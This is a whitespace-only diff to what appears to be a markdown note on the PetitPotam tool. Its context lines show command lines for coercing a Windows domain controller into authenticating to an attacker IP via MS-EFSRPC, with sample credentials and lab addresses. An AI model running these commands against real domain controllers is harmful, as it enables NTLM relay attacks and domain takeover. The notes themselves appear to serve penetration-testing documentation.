@@ -55,17 +55,17 @@ python3 Petitpotam.py -d '' -u '' -p '' [ATTACKER-IP] [TARGET-DC-IP]
 ```plain
 $ python3 Petitpotam.py -d 'offsec.nl' -u 'john' -p 'Welkom1234' 10.31.59.101 10.31.59.105
 
-                                                                                               
+
               ___            _        _      _        ___            _                     
              | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __   
              |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | '  \  
             _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_| 
           _| """ |_|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_|"""""|_|"""""| 
           "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
-                                         
+
 PoC to connect to lsarpc and elicit machine account authentication via MS-EFSRPC EfsRpcOpenFileRaw()
                                       by topotam (@topotam77)
-      
+
                      Inspired by @tifkin_ & @elad_shamir previous work on MS-RPRN
 
 
@@ -99,17 +99,17 @@ Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 ```plain
 $ python3 Petitpotam.py -d '' -u '' -p '' 10.31.59.101 10.31.59.106
 
-                                                                                               
+
               ___            _        _      _        ___            _                     
              | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __   
              |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | '  \  
             _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_| 
           _| """ |_|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_|"""""|_|"""""| 
           "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
-                                         
+
 PoC to connect to lsarpc and elicit machine account authentication via MS-EFSRPC EfsRpcOpenFileRaw()
                                       by topotam (@topotam77)
-      
+
                      Inspired by @tifkin_ & @elad_shamir previous work on MS-RPRN
 
 
